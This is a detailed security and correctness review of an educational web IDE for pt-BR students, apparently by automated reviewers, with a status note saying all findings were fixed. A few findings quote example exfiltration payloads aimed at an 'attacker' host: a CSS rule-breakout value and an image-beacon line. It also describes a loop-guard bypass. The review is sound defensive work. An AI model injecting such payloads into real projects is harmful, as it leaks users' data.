## Overall Assessment

The package is in strong shape: the green baseline (typecheck + 676 tests) reflects a codebase that already survived multiple full reviews, and the highest-risk surfaces (sandbox CSP, postMessage origin checks, per-instance stores, worker URL discipline) are sound — there are **no critical findings** here. What remains are real-but-narrower defects: round-trip data loss in the parser/generator IR path (CSS semicolon truncation, dropped call arguments, overflow literals, mangled accented identifiers), several multi-instance/lifecycle gaps that the green tests structurally can't catch (shared WebContainer FS clobber, orphaned WebGL contexts, leaked Monaco models, a dead block-search shortcut), and a cluster of robustness/UX issues (no save serialization, untimed AI requests, no console auto-scroll, keyboard-unreachable menu). None are sandbox escapes; the dominant theme is **silent data loss on Blocks⇄Code round-trips and on concurrent/multi-instance usage**, which directly undermines the "código é sagrado" contract for the pt-BR student audience. Recommend shipping the High items before broad rollout.

---

## High

### correctness

**1. CSS `parseDeclarations` truncates values containing `;` (data-URIs, quoted strings) — permanent data loss on round-trip**
`correctness` · `src/parsers/css.ts:202-213`
The IR parser splits the declaration block on raw `raw.split(';')` and `part.indexOf(':')`, with no awareness of parens/quotes/comments. `background:url(data:image/png;base64,AAAA)` becomes value `url(data:image/png` (base64 lost); `content:"a;b"` becomes `"a`. The generator re-emits the truncated value, so a Bridge round-trip silently destroys working backgrounds/content. The sibling `parseDeclarationsWithSpans` (299-375) already tracks parens/quotes/comments correctly — the two parsers disagree on the same input.
**Fix:** Factor the existing span-parser state machine into a shared scanner that splits only at `paren==0 && quote==null && !comment`, and locate the first colon at depth 0. Route BOTH parsers through it so they can't diverge. Add a regression test for semicolons-in-values.

**2. Args mutator drops extra argument blocks when a signature shrinks — data loss + orphaned blocks**
`correctness` · `src/blockly/blocks/argsMutator.ts:155-184`
In AUTO mode `count = Math.min(sig.length, MAX_ITEMS)`. `rebuild_` saves children of every `ARG{i}`, removes all inputs (disconnecting real children), then rebuilds only `count` and reconnects `saved[k]` for `k < count`. When the resolved signature shrinks below the saved count, children at `k >= count` are disconnected, never reconnected, never disposed — left as floating orphans that `buildIR` ignores. Fires automatically on `BLOCK_CHANGE` (editing a constructor) and on `FINISHED_LOADING`. Reproduced: `new Pessoa("Ana",20,true)` then trimming the constructor to 1 param drops args 2 and 3 from generated code.
**Fix:** Extend `count` to `Math.max(count, savedMax)` so all typed children survive; label in-signature slots with `${sig[k]}:` and surplus slots with an unlabeled `arg${k+1}:` fallback (never render `undefined:`). Do NOT dispose surplus children. Add a signature-shrink test.

### lifecycle-leak

**3. game-3d WebGLRenderer is never disposed — repeated preview refreshes exhaust WebGL contexts**
`lifecycle-leak` · `src/official-extensions/game-3d/runtime.ts:11-104`
`createScene()` builds a new `THREE.WebGLRenderer` (real WebGL context) on every preview run. `dispose()` is defined but never called: the g3d generator emits no dispose, there's no pagehide handler, and `PreviewIframe` only swaps `srcDoc` (relying on lazy GC). Each "Atualizar" reload mints a fresh context while the prior continues holding the GPU via its running `setAnimationLoop`. After ~16 refreshes the browser force-loses the oldest context and the 3D scene goes black for the rest of the session.
**Fix:** In `dispose()`, after `setAnimationLoop(null)`, call `renderer.forceContextLoss()` (plain `renderer.dispose()` does NOT free the context). Track created worlds module-locally and register a `pagehide` listener (+ `beforeunload` fallback) that disposes them, so refreshes don't rely on GC. `forceContextLoss()` is the load-bearing change.

---

## Medium

### correctness

**4. `renameProject` does a disk load-modify-write that overwrites unsaved in-flight edits**
`correctness` · `src/state/projectStore.ts:1380-1389`
`renameProject` reads the on-disk snapshot via `loadSanitizedProjectById`, spreads it, sets the new name, and `persistProject(next)` — rewriting meta+files+state from a stale read. If the project is open and autosaving in another tab/instance, the rename resurrects stale file bytes (losing the last debounce window of edits) and races the editor's autosave. The list-context branch never reconciles the live editor (`get().project?.id` is null there). This is the same cross-instance autosave class that `deleteProject` explicitly guards.
**Fix:** Make rename a METADATA-ONLY write: add `renameProjectMeta(id, name)` that reads/writes only `projectMetaKey` (leaving files/state untouched), then update the local store if `get().project?.id === id`. The live-store-only fix is insufficient on its own.

**5. `importProjectFromJSON` skips the combined extra-files cap — extras silently dropped on next open**
`correctness` · `src/state/projectStore.ts:1390-1425` (vs 802-807)
The load path applies `limitCombinedExtraFiles(files, …)` so canonical+extras fit under 8 MB. Import sets `extraFiles: sanitizeImportedExtraFiles(...)` directly — canonical and extras are each bounded to 8 MB independently, so combined can exceed 8 MB (and pass the 12 MB import text gate). Import succeeds and persists everything, but the first reopen runs `limitCombinedExtraFiles` and silently pops extras until ≤8 MB; on-disk and opened records disagree.
**Fix:** Mirror the load path: `extraFiles: limitCombinedExtraFiles(files, sanitizeImportedExtraFiles(r.extraFiles))`. Optionally surface a non-fatal notice when extras are trimmed.

**6. Tab-switch / Code-edit collapses 3D blocks; folder rename orphans the open file — two correctness gaps**

- **6a. RootErrorFallback hardcodes `window.location.assign('/')`, violating host-owns-navigation**
  `correctness` · `src/components/layout/ErrorViews.tsx:32-41`
  The "Voltar aos projetos" button hard-navigates to `/` instead of calling the host's `onExit` (which `Studio.tsx:219` never threads into the fallback). Embedded at a sub-route, an unrecoverable render error destroys the host's routing/auth/app-shell context. This is the only hardcoded navigation in `src/`.
  **Fix:** `fallback={(p) => <RootErrorFallback {...p} onExit={onExit} />}`; call `reset()` then `onExit?.()`; render the button only when `onExit` is provided (mirror `Topbar.tsx`). Never hardcode a path.

- **6b. Renaming a directory orphans the open file (stale `activeFile`)**
  `correctness` · `src/components/code/ProFileTree.tsx:60-73`
  `handleRenameSave` only re-selects when `activeFile === renaming.from` (exact match), but `renameProNode` renames the whole subtree (`from/...` → `norm/...`). Renaming a folder containing the open file leaves `activeFile` pointing at a dead path; the editor shows blank and a save may recreate a phantom file. The delete handler does the prefix check; rename doesn't.
  **Fix:** Add the prefix branch: `else if (activeFile.startsWith(`${renaming.from}/`)) onSelectFile(to + activeFile.slice(renaming.from.length))`.

### react

**7. Console panel never auto-scrolls to the newest log**
`react` · `src/components/console/ConsolePanel.tsx:45-54`
The log list is in an `overflow-auto` container with no ref and no scroll effect. Once logs exceed panel height, new preview output lands below the fold and the scroll stays pinned at top — the console looks frozen during exactly the loops/logging a learning IDE exists to observe.
**Fix:** Add a scroll-container ref + a `stickRef` near-bottom flag; in `useLayoutEffect` keyed on `entries.length`, set `scrollTop = scrollHeight` only when sticking, so reading history isn't yanked.

### a11y

**8. ProjectCard actions menu is keyboard-unreachable**
`a11y` · `src/components/projects/ProjectCard.tsx:241-285`
The kebab renders `role="menu"`/`menuitem` via `createPortal` to `document.body`, but never moves focus into the menu on open, has no Arrow/Home/End handling, isn't in Tab order after the trigger (portaled to body end), and doesn't restore focus on close. Only Escape is wired. Keyboard/SR users can open it but can't reach Rename/Duplicate/Export/Delete; the roles mislead assistive tech.
**Fix:** Focus the first `menuitem` on open; add Arrow/Home/End roving focus and Escape-restores-focus on the menu container; call `triggerRef.current?.focus()` on every close path. (Or drop the menu roles for a plain popover — but still move/restore focus.)

### multi-instance

**9. Classic terminal resets the shared WebContainer FS on load, clobbering a second concurrent classic terminal**
`multi-instance` · `src/components/terminal/Terminal.tsx:120-131`
The WebContainer is a tab singleton. Every classic-path `handleLoad()` unconditionally calls `resetWebContainerFs()` (deletes the whole FS root except `node_modules`) then mounts the project at `/`. With two `<Studio>` instances (the supported scenario), loading/reloading editor B's terminal wipes editor A's mounted files out from under A's running `jsh` — A's commands then fail with ENOENT and shell-created files are lost. Terminal is a non-pro feature, so this hits ordinary two-editor pages.
**Fix (minimal):** Add a module-level single-owner token for the classic-terminal FS; if another instance owns it, refuse with a clear "terminal already in use" status instead of resetting. **(Better UX):** Namespace each terminal under `/sz-<instanceId>/`, spawn `jsh` with that `cwd`, and scope-rm only that subtree (never `/`). Update embedding.md.

**10. Unmounting a second Studio leaves all instances without the block-search keyboard shortcut**
`multi-instance` · `src/blockly/searchCategory.ts:85-89, 169-172`
"Last instance wins" steals `startSearch` from earlier instances, but `dispose()` (via `super.dispose()` unregistering `startSearch`) never hands it back. After A→B mount then B unmount, no instance has the Ctrl+B shortcut even though A is alive; it only returns when A's toolbox re-inits. (The clickable search category still works.)
**Fix:** In `dispose()`, after `super.dispose()`, walk surviving workspaces' toolboxes, find a live search category, and re-run its `registerShortcut()` to hand the shortcut back.

### lifecycle-leak

**11. Closed tabs leak their Monaco models for the whole session (worst on `pro` projects)**
`lifecycle-leak` · `src/monaco/MonacoTabs.tsx:187-192`
Models are disposed only in bulk on MonacoTabs unmount/prefix change. Closing a tab drops the file from `filesArray`; `@monaco-editor/react` switches the active model away but does NOT dispose the old one (confirmed in the lib), and nothing in MonacoTabs disposes a model when its file leaves `files`. With `setEagerModelSync(true)`, TS-worker model state lingers too. Negligible for the 3 canonical files, but `ProCodeMode` renders the same component over a full file tree — browsing/closing dozens of files grows the registry until mode/project switch.
**Fix:** Add a reconcile effect keyed on `[files, saltedPrefix, mountedEditor]` that disposes models under `saltedPrefix` not in the open set, skipping the editor's active model. Keep the unmount sweep as backstop.

### robustness

**12. No per-project write serialization — an in-flight autosave can land after a newer save (remote adapters)**
`robustness` · `src/persistence/service.ts:120-156, 203-225`
`persistAndMark()` calls `await adapter.save(project)` with no per-id mutex; once a debounce timer fires the save is untracked, so a subsequent edit's save races it. `save()` also can't cancel an already-fired autosave. The default IndexedDB path is safe (IDB orders same-store transactions by creation order), but a **remote/BFF adapter** (a supported mode) can have the older POST commit last and silently lose the newer edit.
**Fix:** Serialize per project id via an in-flight chain (`runSerialized(id, task)`); route both `persistAndMark`'s and `save()`'s `adapter.save` through it, re-checking the `deletedProjects` guard inside the chained task.

**13. `flushPending` on tab close can't complete async/remote writes — last edit lost with non-local adapters**
`robustness` · `src/persistence/service.ts:158-173, 186-188`
`flushPending()` fires `void persistAndMark(project)` and returns synchronously; pagehide/beforeunload can't await. For a remote adapter the `fetch` is aborted on document discard, and `onChange` (how `'none'`/remote hosts persist) is fire-and-forget — no `sendBeacon`/`keepalive`. The "last edit on close" that flush exists to protect is the one most likely lost.
**Fix:** Add an optional `ctx: { reason: 'autosave' | 'flush' }` second arg to `onChange` so hosts can switch to `sendBeacon`/`fetch keepalive` on `'flush'`; document in `types.ts` + embedding.md that the close-time flush requires a keepalive transport. (The library can't call sendBeacon itself.)

**14. Preview heartbeat watchdog can't interrupt non-loop synchronous work — host tab freezes**
`robustness` · `src/components/preview/PreviewIframe.tsx:222-345`
The null-origin `srcdoc` iframe shares the host's main thread. The loop guard only instruments syntactic loops; `Array.from({length:1e10})`, giant `JSON.parse`, ReDoS, deep recursion, etc. never tick and freeze the shared thread. Layer B only *detects* the stall — `setPreviewRunning(false)` is queued on the same frozen thread, so the "Parar" button is inert until the computation finishes. Freezes the editor and any sibling instance. `previewBudget` gates input size, not cost.
**Fix:** Document as a known limitation of the same-thread sandbox. The only true fix is running the preview cross-origin/cross-process (distinct sandbox origin/subdomain or worker-backed renderer) so Site Isolation puts user code on its own process. Same-thread affordances (`requestIdleCallback`, MutationObserver) can't run during the freeze.

**15. Loop guard is trivially bypassable: `window.__szLoopTick` is a writable global redefinable by user code**
`robustness` · `src/preview/loopGuard.ts:147-157`
The tick is an ordinary writable/configurable global, defined before the user script. `__szLoopTick = () => {}` (intentional, or an accidental name collision in classic-script scope) disables loop-budget enforcement for all subsequent loops; `while(true){}` then hard-freezes the shared host thread (Layer B can't interrupt a never-yielding loop).
**Fix:** Define the tick as a hoisted named function and lock it with `Object.defineProperty(window, '__szLoopTick', { value, writable:false, configurable:false, enumerable:false })`, with a try/catch fallback. Closes both the deliberate and accidental-collision paths. (Non-loop freezes remain unguarded — see #14.)

### ai

**16. Non-streaming AI requests have no timeout — a hung response locks the panel busy for the session**
`robustness` · `src/ai/providers/openRouterProvider.ts:112-143`
Only the streaming path gets an idle timeout. Explain-block/error, suggest, and challenge all call `chat()` without `onToken`, taking the untimed `await response.json()` branch. If OpenRouter returns headers then stalls the body, the promise never settles, `streamResponse`'s `finally` never runs, and `busy` stays true forever — every AI button and the input are disabled until reload. (Also covers the no-connect-timeout variant at 112-137: a stalled handshake hangs even the streaming path before the idle timer engages.)
**Fix:** Add a wall-clock timeout in `chat()` via a controller chained to `options.signal`, bounding both the initial fetch and `response.json()`; `clearTimeout` once headers arrive so a healthy long stream isn't killed. A timeout rejects the awaited promise, releasing `busy` and surfacing an error. Secondary: a Stop button not disabled by `busy`.

---

## Low

### correctness

**17. Overflowing numeric literal (e.g. `1e1000`) → `Infinity` → serialized as `null` → generated as `0`**
`correctness` · `src/parsers/js.ts:615-616, 1852, 2165`
Babel parses `1e1000` with no error and `value === Infinity`; `isSimpleValue` accepts `num`, so the IR carries `Infinity`, which JSON-serializes to `null` and the generator's `formatNumber` maps both to `'0'`. `const x = 1e1000` silently becomes `const x = 0` after a round-trip.
**Fix:** In `toExpr` (1852) return `null` for non-finite NumericLiteral so it falls to `asRaw`. For the var fast-path (615-616) there is no asRaw — delete that branch and let it fall through to the generic `toExpr`→`asRaw`, or add a `Number.isFinite` guard so it does.

**18. CSS generator emits selectors/values/keyframe names verbatim — rule-breakout / CSS exfil into preview `<style>`**
`security` · `src/generators/css.ts:164-180`
`renderRule`/`renderKeyframes` emit `${selector} {`, `${key}: ${value};`, `@keyframes ${name}`, `${step.at} {` with no `{`/`}`/`;` escaping. `escapeStyleContent` only neutralizes `</style>`. A value like `red; } body { background:url(https://attacker/leak)` injects a second rule; CSP `img-src https:` permits CSS `url()` exfil (a keylogger via attribute selectors). Reachable from blocks fields, imported JSON, and AI IR. Bounded to the null-origin preview (no script exec gained, no sandbox escape), hence low.
**Fix:** Strip/reject `{`/`}` (and stray `;` in values) in `renderRule`/`renderKeyframes`, dropping offending rules. Tighten the Zod schema (`selector`/`name`/`at`: `/^[^{}]*$/`; declaration values: `/^[^{};]*$/`) so imported IR can't carry braces. Schema regex is the durable fix; generator strip is belt-and-suspenders.

**19. `random(min,max)` emits each bound twice — side-effecting bounds evaluate twice**
`correctness` · `src/generators/expr.ts:246-255`
Compiled as `Math.floor(Math.random()*((max)-(min)+1))+(min)`, emitting `min` twice (author's comment acknowledges this). `random(lista.pop(), 10)` pops the array twice, yielding wrong/skewed results.
**Fix:** Use an IIFE: `((min,max)=>Math.floor(Math.random()*(max-min+1))+min)(${min},${max})`. Optionally keep the inline form when both bounds are pure node types. (`reserveInternal` won't work — `compileExpr` can't emit binding statements.)

**20. Canvas width/height are dropped on IR→Blocks conversion**
`correctness` · `src/blockly/workspaceState.ts:257-260`
`htmlNodeToBlockInner` emits only `{ ID }` for a canvas; `width`/`height` (carried by the IR and emitted by the HTML generator) are dropped, and the reverse path reads nonexistent `W`/`H` fields. Opening code with `<canvas width=200 height=100>` and round-tripping through Blocks loses the dimensions (preview reverts to 300×150).
**Fix:** Stash `width`/`height` in the block's `data` JSON when present (mirror `extraData`), and parse `block.data` in `buildIR`'s `sz_html_canvas` case instead of reading absent fields.

**21. `splitHtml` falls back to the whole document as body when `<html>` is present but `<body>` is absent**
`correctness` · `src/preview/bootstrap.ts:171-182`
With `<html>` present but no `</body>` (unclosed/missing body), `bodyMatch?.[1] ?? html` dumps the entire document — doctype, `<html>`, full `<head>` — into the generated `<body>`, rendering head metadata as body content with a nested doctype. Common malformed student HTML; security head is unaffected.
**Fix:** In the no-`bodyMatch` branch, strip `<head>…</head>`, the doctype, and `<html>`/`</html>` from the fallback rather than echoing the whole document.

**22. Extension-removal block cleaner coerces a surviving next-slot shadow into a real block**
`correctness` · `src/state/extensionsAdapter.ts:164-190`
When the parent survives, line 187 rebuilds `next: { block: nextBlocks[0] }` — re-emitting a `shadow`-only survivor under `block` (shadow→real) and discarding `nextBlocks[1]`. `cleanWrapper` preserves the distinction for inputs; next-slot handling diverges. Rare (this package never emits next-slot shadows itself), so low.
**Fix:** Reuse `cleanWrapper` for the surviving-parent next slot: `next: obj.next ? (cleanWrapper(obj.next, types) ?? undefined) : undefined`. Keep the parent-removed branch unchanged.

**23. Tab switch emits an `onCursorChange` tagged with the PREVIOUS file name**
`correctness` · `src/monaco/MonacoTabs.tsx:194-196, 266-279`
`currentFileNameRef` updates in a parent effect that runs AFTER the child's model-switch effect, so a cursor event fired during `restoreViewState` on tab re-visit is tagged with the old file name. Currently latent (no consumer wires `onCursorChange`), but a trap for code→blocks cross-highlighting.
**Fix:** Derive the file name in the handler from the editor's current model path (`getMonacoModelPath`) guarded by `startsWith(saltedPrefix + '/')`, not the lagging ref. (The `e.source !== 'model'` guard is unreliable — `restoreViewState` uses `'api'`.)

### dx

**24. `normalizeIdentifier` strips non-ASCII letters, mangling pt-BR identifiers (`número` → `n_mero`)**
`dx` · `src/generators/expr.ts:395-399`
Every char outside `[A-Za-z0-9_$]` becomes `_`, so legal Unicode-letter identifiers (`número`, `posição`, `usuário`, `calcularÁrea`) are silently renamed on every Blocks→Code generation — a round-trip fidelity regression for the primary pt-BR audience. Collision-safe (scope keys on original name), so correctness is fine.
**Fix:** Accept names already valid via `/^[\p{ID_Start}$_][\p{ID_Continue}$]*$/u`; only ASCII/Unicode-collapse genuinely invalid ones (still prefix leading digits, suffix reserved words).

**25. `params mutator` sanitize allows leading-digit / reserved-word names**
`robustness` · `src/blockly/blocks/paramsMutator.ts:50-57`
`sanitize` strips non-identifier chars but doesn't reject `2x`/`class`/`return`. Safe today only because the generator's `normalizeIdentifier` rescues emitted code; the block model carries an invalid identifier as source of truth.
**Fix:** Reuse `normalizeIdentifier` in `sanitize` (extract it to a shared module if a blockly→generators dep is undesirable) so the block-layer name and emitted code stay identical.

**26. `resolveStudioConfig` returns dead `previewSecurity`/`learning` fields that never reflect host limits**
`dx` · `src/studio/config.ts:142-144`
It always returns module defaults, unconditionally overwritten by `Studio.tsx`. Any other caller (it's exported and unit-tested directly) silently gets defaults that ignore host `limits`/learning. Latent refactor trap.
**Fix:** Split the return type so `previewSecurity`/`learning` are attached only at the Studio.tsx call site (type-mandatory), keeping `STANDALONE_CONFIG` as the sole hardcoder.

**27. EXTENSIONS.md claims permissionGuard gates audio/storage, but it only neutralizes network APIs**
`dx` · `src/preview/permissionGuard.ts:39-97`
The guard wraps only fetch/XHR/WebSocket/EventSource/sendBeacon; there is no AudioContext/localStorage/cookie gating. Misleading security docs — a reviewer could approve an extension believing audio/storage are enforced. Not a hole today (both are baseline-granted).
**Fix:** Rewrite EXTENSIONS.md to state the guard enforces only network APIs; canvas/keyboard/mouse/audio/storage are baseline-granted and declarative-only. Don't implement gating (contradicts the documented design).

**28. game-3d Bridge reverse-parse missing: editing 3D code collapses g3d blocks into raw advanced-code**
`correctness` · `src/parsers/js.ts:1040-1226`
There's an `asSZGame2DCall` recognizer but no g3d equivalent. game-3d is Bridge-eligible (generator emits g3d:*), so editing 3D code in Bridge mode degrades the structured blocks to an opaque "código avançado" block. User JS is preserved; only block structure is lost. Narrow (game-3d is advanced-level, off by default).
**Fix:** Either add `asSZGame3DCall` + matchers (mirror g2d: `createScene`/`createBox`/`createSphere` var-init and `animate`/`setPosition`/`setRotation` statements, tracking world/object vars) with a round-trip test, OR explicitly gate game-3d out of Bridge and document the limitation. Don't leave the silent degradation.

### react / lifecycle / security

**29. Mode-coercion memo reads `config.allowedModes` but doesn't depend on `features` — feature-driven restriction skipped**
`react` · `src/studio/Studio.tsx:114-122`
`sanitized`'s deps use `allowedModesKey` (the PROP), not `config.allowedModes`. Flipping `features={{professional:true}}` on a mounted non-pro Studio sets `config.allowedModes=['code']` but doesn't recompute coercion, leaving the editor in a now-forbidden mode with a hidden-but-active tab. UI inconsistency only.
**Fix:** Key the memo on `config.allowedModes.join('|')` (a stable primitive that flips precisely when resolved modes change). Do NOT add raw `features` — inline-object churn would re-hydrate and discard unsaved edits.

**30. AI chat does not scroll to the latest / streaming message**
`react` · `src/components/ai/AIPanel.tsx:283-287`
The transcript is `overflow-auto` with no ref/scroll effect; streamed tokens and new messages accumulate below the fold. Undercuts the streaming UX. AI panel is off by default, hence low.
**Fix:** Add a transcript ref + sticky-bottom effect keyed on `[messages]` using `scrollTop = scrollHeight` (not `scrollIntoView`), with a near-bottom guard.

**31. Create-file input doesn't refocus when retargeting the create form while open**
`react` · `src/components/code/ProFileTree.tsx:133-152, 206-223`
The new-item input relies on bare `autoFocus`, which fires only on mount. Clicking a folder's `+` while the form is already open changes `creating` but doesn't refocus; a fast keyboard user types into nothing.
**Fix:** Add a `createInputRef` + `useEffect(() => { if (creating) createInputRef.current?.focus() }, [creating])`; drop bare `autoFocus`.

**32. Pro preview leaves an orphaned `npm install` running when unmounted mid-install**
`lifecycle-leak` · `src/modes/pro/ProPreview.tsx:93-115`
During install the effect awaits `Promise.race([install.exit, timeout])`; on unmount/project-switch the cleanup kills only `devProcessRef.current` (still null), and after the race `if (cancelled) return` skips `install.kill()`. The install keeps running in the singleton container, slowing the next boot. The dev-spawn path right below handles this correctly.
**Fix:** At the cancelled-return, add `try { install.kill() } catch {}` (mirrors the dev path); killing closes the output stream.

**33. `deletedProjects` module-global Set grows unbounded for the tab lifetime**
`lifecycle-leak` · `src/persistence/service.ts:53-58, 143-156, 203-209`
`cancelPendingAutosavesFor` adds a ULID per deletion to fence in-flight saves; entries are removed only if a project with that exact id is later scheduled/saved. ULIDs are never reused, so each deleted project leaks one ~26-char string forever. Real but negligible (needs thousands of deletions in one un-reloaded session). *(Reported twice — merged.)*
**Fix:** Make it a timestamped `Map` pruned lazily on a grace window (e.g. 60s) larger than any realistic save, OR reference-count in-flight persists per id. Do NOT clear at `delMany` resolution — that re-opens the resurrection race the post-await check guards.

**34. Importmap JSON is the only code-emitting path bypassing script-content escaping**
`security` · `src/preview/bootstrap.ts:99-112`
Built as `<script type="importmap">${JSON.stringify(...)}</script>` with no escaping, unlike every other emitted script. Safe today only because keys are allowlisted (`[A-Za-z0-9._-]`) and values are base64/first-party — a latent injection foothold if importmap inputs ever widen.
**Fix:** `.replace(/<\/script/gi, '<\\/script')` on the serialized JSON (the only JSON-safe substitution). Do NOT route through `escapeScriptContent` — its `\!`/`\s` insertions are invalid JSON escapes and break `JSON.parse`. Add a comment naming the invariant.

**35. Installing game-3d forces ALL student JS into module scope — breaks inline `onclick`/global functions**
`correctness` · `src/preview/bootstrap.ts:119-129`
The student script becomes `<script type="module">` when `needsModules` (any extension with `esmImports`, i.e. game-3d). In module scope top-level decls aren't global, so `function jump(){}` is unreachable from `onclick="jump()"` — exactly what the adjacent comment claims to prevent. Triggered by installing an unrelated 3D extension; advanced-level/off-by-default keeps it low.
**Fix:** When the student's own JS has no import/export but `needsModules`, emit it as a DEFERRED EXTERNAL classic script via a `data:` URL (`<script defer src="data:text/javascript;base64,…">`) — classic scope (globals work) + deferred ordering after the extension bootstrap. Inline `<script defer>` is ignored, so it must be external.

**36. CSP allows passive https GET exfiltration (img-src / self-navigation) — keep documented**
`security` · `src/preview/csp.ts:50-62`
By design `img-src/media-src/font-src/frame-src` allow `https:` while connect-src is `'none'`. A shared/imported project's JS can one-way beacon preview-local data via `new Image().src='https://attacker/?'+document.title` or sandboxed-frame self-navigation. Null origin prevents reading anything back; low residual risk.
**Fix:** Document the residual one-way GET channel in the CSP comment. For hardened hosts, gate `https:` passive subresources behind a separate opt-in (`subresourceAllowedOrigins`), not `fetchAllowedOrigins` (wrong axis). Self-navigation can't be closed via CSP.

**37. `escapeScriptContent` backslash insertion changes semantics of `<script`/`<!--` inside a regex literal**
`correctness` · `src/generators/escape.ts:26-36`
`<script`→`<\script` and `<!--`→`<\!--` are not transparent in regex literals: `/<script>/` becomes `/<\script>/` (matches `<` + whitespace + `cript`), and `/<!--/u` throws a parse-time `SyntaxError: Invalid escape`, killing the whole preview script. The `</script`→`<\/script` rule is safe. No XSS — early-close is still prevented.
**Fix:** Route the main user script through the existing `data:text/javascript;base64,…` path (no escaping; byte-identical), preserving classic global scope for the no-extras case. At minimum, fix the doc comment that claims `<\script`/`<\!--` equivalence.

### robustness (ai)

**38. Initial fetch has no connect/header timeout on any path (incl. streaming)**
`robustness` · `src/ai/providers/openRouterProvider.ts:112-137`
`STREAM_IDLE_TIMEOUT_MS` only ticks after `response.body` is obtained; the `await fetchImpl(...)` itself is unbounded. A stalled handshake (cold model/proxy) hangs before streaming begins, so the idle timeout never engages and the panel stays busy until reload. *(Closely related to #16; same root remediation.)*
**Fix:** Bound only the connect/header phase with a timeout controller combined with `options.signal`, and `clearTimeout` once headers arrive so a healthy long stream isn't aborted.

---

## Nit

*(None — all confirmed findings rose to low or above.)*
---

## Completeness critic — coverage gaps & one new bug

- **`t()` crashes the whole IDE on an out-of-enum locale** · `robustness` · `src/core/i18n/index.ts:36-41` — `DICT[currentLocale][key]` throws `TypeError` if `currentLocale` is ever a value not in `DICT` (host passes an unexpected `locale` prop / `setLocale` called from untyped JS). Today latent (only `pt-BR`/`en` are reachable through typed call sites). **Fix:** `const raw = (DICT[currentLocale] ?? DICT['pt-BR'])[key] ?? key`.
- **Cross-bundler worker-URL rule is asserted but never built in CI** · `dx` · `playground/vite.config.ts` — Non-negotiable rule #1 protects Turbopack/webpack, but only the Vite playground ever builds. A real Next/Turbopack smoke build would catch a regression the test suite can't. (Process gap, not a code bug.)
- **Persistence/debounce timing is tested without fake timers** · `dx` · `src/persistence/service.ts` — Relies on the `setAutosaveDelayForTests` shrink-the-delay hook; real-clock flake risk and a blind spot for race ordering. (Test-quality gap.)

---

## Methodology

15 parallel reviewers (13 subsystems + cross-cutting security and multi-instance/lifecycle sweeps) over ~41.7k LOC / 167 source files. Every raised finding was independently re-checked by an adversarial verifier reading the cited code (default-to-refute), then deduped, ranked, and critiqued for coverage. **58 raised → 45 confirmed → 38 after dedup → 13 refuted.** Baseline at review time: `tsc --noEmit` clean, 676 tests / 0 fail. Five headline findings (CSS `;`-truncation, args-mutator shrink, game-3d WebGL leak, terminal FS clobber, i18n crash) were re-verified by hand against the source.

---

## Status de implementação (2026-06-14)

TODOS os achados confirmados foram corrigidos. Gates verdes no pacote inteiro:
**lint (`bun run check`) 0 erros / 0 warnings · typecheck `tsc --noEmit` limpo · `bun test src` 751 pass / 0 fail** (baseline era 676; +75 testes de regressão).

Duas resoluções que fogem do que o achado propôs (documentadas aqui para não se perderem):

- **#37 (escapeScriptContent) foi REVERTIDO, não aplicado como sugerido.** Remover a neutralização de `<!--`/`<script` reintroduzia o breakout de "script data double escaped": com `<!--` + `<script` o tokenizer entra em duplo-escape e o `</script>` REAL do gerador deixa de fechar o elemento (o resto do documento vira script). A neutralização das ABERTURAS é necessária. O risco original de #37 (corromper regex literais `/<!--/u`) é mitigado pelo caminho de `data:` URL do script do aluno no preview (#35) e é raro/baixo no `index.html` persistido. Limitação documentada no comentário de `escape.ts`.
- **#1 × #18 (conflito) reconciliado.** #1 exige preservar `;` em valores legítimos (`url(data:…;base64,…)`, `content:"a;b"`); #18 rejeitava todo `;`. Resolução: rejeitar SEMPRE chaves `{`/`}` (breakout de regra) e o `;` APENAS em profundidade 0 (fora de parênteses/aspas) — o parser nunca produz `;` em profundidade 0, então valores legítimos sobrevivem e a injeção (`red; } body {…}`, que tem `}`) continua barrada. Schema relaxado para `/^[^{}]*$/`; a checagem de `;` em profundidade 0 vive em `isSafeDeclarationValue` (generators/css.ts).

Ajustes de integração feitos na verificação (além dos 12 agentes): correção de tipos cruzados (SettingsDrawer.test, classMutators.test, ProjectCard.test, i18n.test, ProPreview.test), `renameProjectMeta` realocado para `state/persistence.ts` (sem duplicar prefixo/DB), e **três testes que travavam o runner em loop infinito** foram corrigidos pela RAIZ: (a) provider OpenRouter agora limita o `fetch` por corrida contra o timeout mesmo quando o fetch ignora o AbortSignal; (b) `runSerialized` roda a task de imediato quando não há save em voo (a microtask adiada quebrava o timing dos testes); (c) stub de teste do ProPreview com `ensureMounted` ESTÁVEL (o provider real memoiza com useCallback — stub instável causava render-loop). Docs (`embedding.md`, `EXTENSIONS.md`) atualizadas para #9/#13/#14/#27/#36.
